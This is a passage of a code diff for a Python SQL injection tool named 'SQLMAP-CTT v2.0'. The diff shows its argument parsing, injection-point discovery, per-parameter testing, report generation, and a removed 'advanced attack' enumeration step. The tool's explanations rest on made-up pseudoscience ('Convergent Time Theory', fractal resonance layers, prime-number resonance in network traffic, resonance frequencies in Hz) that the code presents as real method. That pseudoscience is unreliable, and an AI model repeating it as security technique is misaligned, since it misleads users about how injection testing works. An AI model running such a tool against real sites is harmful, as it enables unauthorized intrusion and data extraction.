+                recommendations.append("🔗 UNION-based SQLi detected - direct data extraction possible")
+            if 'prime_resonance' in vuln_types:
+                recommendations.append("⚡ Prime resonance detected - optimize for prime layers")
+            if 'resonance_pattern' in vuln_types:
+                recommendations.append("🎵 Resonance patterns detected - frequency tuning successful")
+            
+            # Layer recommendation
+            best_layer = max(self.layer_performance.items(), key=lambda x: x[1])[0]
+            recommendations.append(f"🎯 Most effective CTT layer: {best_layer}")
+            
+            if best_layer in self.fractal_engine.primes:
+                recommendations.append("⚡ Prime layer shows strong resonance - prioritize for advanced attacks")
+        else:
+            recommendations.append("❌ No CTT vulnerabilities detected with current parameters")
+            recommendations.append("💡 Try adjusting α, resonance frequency, or prime selection")
         
-        # Layer recommendations
-        best_layer = max(self.layer_performance.items(), key=lambda x: x[1])[0]
-        recs.append(f"Most effective layer: {best_layer} ({'prime' if best_layer in CTT_PRIMES else 'composite'})")
+        # CTT-specific recommendations
+        recommendations.append(f"🔧 CTT Alpha (α): {self.fractal_engine.alpha}")
+        recommendations.append(f"🎵 Resonance Frequency: {self.fractal_engine.resonance_freq} Hz")
+        recommendations.append(f"🔢 Primes used: {len(self.fractal_engine.primes)}")
+        recommendations.append("🔒 Test only on authorized systems with proper consent")
         
-        if best_layer in CTT_PRIMES:
-            recs.append(f"Prime layer {best_layer} shows strong resonance - prioritize")
-        
-        return recs
+        return recommendations
 
 # ============================================================================
-# MAIN EXPLOIT INTERFACE
+# MAIN INTERFACE WITH ARGPARSE
 # ============================================================================
 def main():
-    print("""
-    ╔══════════════════════════════════════════════════════════╗
-    ║   🔥 SQLMAP-CTT v2.0 - 33-Layer Fractal SQL Injection   ║
-    ║   Convergent Time Theory Enhanced Penetration Testing   ║
-    ╚══════════════════════════════════════════════════════════╝
+    parser = argparse.ArgumentParser(
+        description='SQLMAP-CTT v2.0: 33-Layer Fractal Resonance SQL Injection',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='''
+Examples:
+  %(prog)s -u "http://test.com/page?id=1"
+  %(prog)s -u "http://test.com/search?q=test" --ctt-alpha=0.0302011
+  %(prog)s -u "http://test.com/" --ctt-primes=10007,10009 --resonance-freq=587000
+  %(prog)s -u "http://test.com/" --temporal-threads=11 --timeout=20
+        '''
+    )
+    
+    parser.add_argument('-u', '--url', required=True, help='Target URL')
+    parser.add_argument('--ctt-alpha', type=float, default=0.0302011, 
+                       help='CTT temporal dispersion coefficient (default: 0.0302011)')
+    parser.add_argument('--ctt-primes', type=str, default='',
+                       help='Custom prime numbers for resonance (comma-separated)')
+    parser.add_argument('--resonance-freq', type=float, default=587000,
+                       help='Resonance frequency in Hz (default: 587000)')
+    parser.add_argument('--temporal-threads', type=int, default=11,
+                       help='Number of temporal threads (default: 11)')
+    parser.add_argument('--timeout', type=int, default=15,
+                       help='Request timeout in seconds (default: 15)')
+    parser.add_argument('--output', type=str, default='',
+                       help='Output file for report (default: auto-generated)')
+    
+    args = parser.parse_args()
+    
+    # Parse custom primes
+    custom_primes = []
+    if args.ctt_primes:
+        try:
+            custom_primes = [int(p.strip()) for p in args.ctt_primes.split(',')]
+            print(f"[+] Using custom primes: {custom_primes[:5]}...")
+        except ValueError:
+            print(f"[!] Invalid primes format. Using default primes.")
+            custom_primes = None
+    
+    print(r"""
+     _____ _____ __  __    _    ____ _____ 
+    / ____/ ____|  \/  |  / \  / ___|_   _|
+   | (___| (___ | \  / | / _ \| |     | |  
+    \___ \\___ \| |\/| |/ ___ \ |___  | |  
+     ____) |___) | |  | /_/   \_\____| |_  
+    |_____/_____/|_|  |_|      CTT v2.0
+    
+    33-Layer Fractal SQL Injection Engine
+    Convergent Time Theory Enhanced
     """)
     
-    if len(sys.argv) < 2:
-        print("[!] Usage: python sqlmap_ctt_v2.py <target_url> [param=value]")
-        print("[!] Example: python sqlmap_ctt_v2.py http://test.com/search.php search=test")
-        sys.exit(1)
-    
-    target_url = sys.argv[1]
-    
-    # Parse parameters
-    params = {}
-    if len(sys.argv) > 2:
-        for arg in sys.argv[2:]:
-            if '=' in arg:
-                key, value = arg.split('=', 1)
-                params[key] = value
-    
-    print(f"[+] Target: {target_url}")
-    print(f"[+] Parameters: {params}")
+    print(f"[+] Target URL: {args.url}")
     print(f"[+] CTT Configuration:")
-    print(f"    • Layers: {CTT_LAYERS}")
-    print(f"    • Alpha: {CTT_ALPHA}")
-    print(f"    • Prime layers: {len(CTT_PRIMES[:CTT_LAYERS])}")
-    print(f"    • Fractal resonance: ENABLED")
+    print(f"    • Alpha (α): {args.ctt_alpha}")
+    print(f"    • Resonance Frequency: {args.resonance_freq} Hz")
+    print(f"    • Temporal Threads: {args.temporal_threads}")
+    print(f"    • Custom Primes: {'Yes' if custom_primes else 'No'}")
+    print(f"    • Timeout: {args.timeout}s")
     print("-" * 60)
     
-    # Initialize CTT engine
-    engine = CTT_SQLInjectionEngine(target_url)
-    
-    # Test each parameter
-    all_results = []
-    for param_name, param_value in params.items():
-        print(f"\n[+] Testing parameter: {param_name}")
-        print(f"    Value: {param_value}")
+    try:
+        # Initialize CTT engine with custom parameters
+        engine = CTT_SQLInjectionEngine(
+            target_url=args.url,
+            timeout=args.timeout,
+            alpha=args.ctt_alpha,
+            custom_primes=custom_primes,
+            resonance_freq=args.resonance_freq,
+            temporal_threads=args.temporal_threads
+        )
         
-        results = engine.test_injection_point(param_name, param_value, 'GET', 'adaptive')
+        # Discover injection points
+        print("[+] Discovering injection points...")
+        injection_points = engine.discover_injection_points()
         
-        # Analyze results
-        vulnerable = any(r['vulnerable'] for r in results)
-        if vulnerable:
-            print(f"    ✅ VULNERABLE DETECTED!")
+        if not injection_points:
+            print("[!] No injection points found. Try specifying parameters in URL.")
+            print("[!] Example: http://site.com/page?param1=value1")
+            sys.exit(1)
+        
+        print(f"[+] Found {len(injection_points)} potential injection points")
+        
+        # Test each injection point
+        all_results = []
+        for i, point in enumerate(injection_points):
+            print(f"\n[{i+1}/{len(injection_points)}] Testing: {point['parameter']} ({point['type']})")
+            print(f"    Context: {point['context']}")
             
-            # Show best layer
-            best_result = max(results, key=lambda x: x['confidence'])
-            print(f"    Best layer: {best_result['layer']} (confidence: {best_result['confidence']:.2f})")
+            results = engine.test_injection_point(
+                point['parameter'], 
+                point['value'], 
+                point['type']
+            )
             
-            # Execute advanced attack
-            print(f"    Executing advanced enumeration...")
-            advanced_results = engine.execute_advanced_attack(param_name, param_value, 'enumeration')
+            # Summarize results for this parameter
+            vulnerable = any(r['vulnerable'] for r in results)
+            if vulnerable:
+                vuln_count = sum(1 for r in results if r['vulnerable'])
+                best_conf = max(r['confidence'] for r in results if r['vulnerable'])
+                print(f"    ✅ CTT VULNERABILITY DETECTED! ({vuln_count} payloads, max confidence: {best_conf:.2f})")
+            else:
+                print(f"    ❌ No vulnerability detected")
             
-            # Show findings
-            for adv in advanced_results:
-                if adv['result']:
-                    print(f"    Layer {adv['layer']} found data")
+            all_results.extend(results)
+        
+        # Generate final report
+        print("\n" + "=" * 60)
+        print("CTT SQL INJECTION REPORT")
+        print("=" * 60)
+        
+        report = engine.generate_report()
+        
+        print(f"Target: {report['target']}")
+        print(f"Time elapsed: {report['total_time']:.1f}s")
+        print(f"Requests made: {report['statistics']['requests']}")
+        print(f"Injection attempts: {report['statistics']['injections']}")
+        print(f"Successful CTT detections: {report['statistics']['successful']}")
+        print(f"Effectiveness: {report['effectiveness']:.1%}")
+        print(f"CTT Parameters:")
+        print(f"  • Alpha: {report['ctt_parameters']['alpha']}")
+        print(f"  • Resonance Frequency: {report['ctt_parameters']['resonance_freq']} Hz")
+        print(f"  • Primes Used: {len(report['ctt_parameters']['primes_used'])}")
+        
+        if report['best_layer'] >= 0:
+            print(f"Best CTT layer: {report['best_layer']} (performance: {report['best_layer_performance']:.2f})")
+        
+        print(f"\nRecommendations:")
+        for rec in report['recommendations']:
+            print(f"  {rec}")
+        
+        # Save report
+        if args.output:
+            report_file = args.output
         else:
-            print(f"    ❌ No vulnerability detected")
+            timestamp = int(time.time())
+            report_file = f"ctt_sqli_report_{timestamp}.json"
         
-        all_results.extend(results)
-    
-    # Generate final report
-    print("\n" + "=" * 60)
-    print("CTT ATTACK REPORT")
-    print("=" * 60)
-    
-    report = engine.generate_attack_report()
-    
-    print(f"Target: {report['target']}")
-    print(f"Total requests: {report['statistics']['requests']}")
-    print(f"Successful injections: {report['successful_payloads']}")
-    print(f"Layers used: {len(report['statistics']['layers_used'])}/{CTT_LAYERS}")
-    print(f"Prime layers used: {len(report['statistics']['primes_used'])}")
-    print(f"Prime effectiveness: {report['prime_effectiveness']:.2f}")
-    
-    print(f"\nOptimal attack strategy:")
-    optimal = report['optimal_layers']
-    print(f"  Layers: {optimal['layers']}")
-    print(f"  Confidence: {optimal['confidence']:.2f}")
-    print(f"  Prime bias: {optimal['prime_bias']:.2f}")
-    
-    print(f"\nRecommendations:")
-    for rec in report['recommendations']:
-        print(f"  • {rec}")
-    
-    print("\n[+] CTT v2.0 Enhancements:")
-    print("  1. 33-Layer Fractal Payload Generation")
-    print("  2. Prime Harmonic Resonance")
-    print("  3. Adaptive Layer Optimization")
-    print("  4. Temporal Signature Analysis")
-    print("  5. Quantum-Resistant Encoding")
-    
-    print("\n[⚠️] Legal/ethical use only. Authorized testing only.")
-    print("[+] CTT Research Group - Advancing security through physics")
+        with open(report_file, 'w') as f:
+            json.dump(report, f, indent=2, default=str)
+        
+        print(f"\n[+] Detailed CTT report saved to: {report_file}")
+        
+        # Final CTT notes
+        print("\n" + "=" * 60)
+        print("CTT TECHNOLOGY NOTES:")
+        print("=" * 60)
+        print("1. CTT uses 33-layer fractal resonance for enhanced detection")
+        print("2. Alpha (α) controls temporal dispersion in payloads")
+        print("3. Prime numbers create resonance patterns in network traffic")
+        print("4. Resonance frequency tunes detection to specific patterns")
+        print("5. Temporal threads enable parallel layer testing")
+        print("=" * 60)
+        print("⚠️  AUTHORIZED USE ONLY - RESPONSIBLE DISCLOSURE REQUIRED")
+        print("=" * 60)
+        
+    except KeyboardInterrupt:
+        print("\n[!] CTT scan interrupted by user")
+        sys.exit(1)
+    except Exception as e:
+        print(f"[!] CTT fatal error: {e}")
+        import traceback
+        traceback.print_exc()
+        sys.exit(1)
 
 if __name__ == "__main__":
+    # Check for required packages
+    try:
+        import numpy
+        import scipy
+        import requests
+    except ImportError as e:
+        print(f"[!] Missing required package: {e}")
+        print("[!] Install with: pip install numpy scipy requests")
+        sys.exit(1)
+    
     main()
